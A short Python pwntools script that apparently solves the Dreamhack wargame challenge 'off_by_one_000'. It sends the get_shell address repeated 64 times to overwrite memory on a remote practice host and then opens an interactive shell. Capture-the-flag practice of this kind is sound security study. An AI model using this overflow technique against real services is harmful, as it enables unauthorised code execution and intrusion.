from pwn import *
context.log_level='debug'

n = remote('host1.dreamhack.games',8398)
elf = ELF('./off_by_one_000')

get_shell = elf.symbols['get_shell']

payload = p32(get_shell)*64

n.sendafter('Name:',payload)

n.interactive()
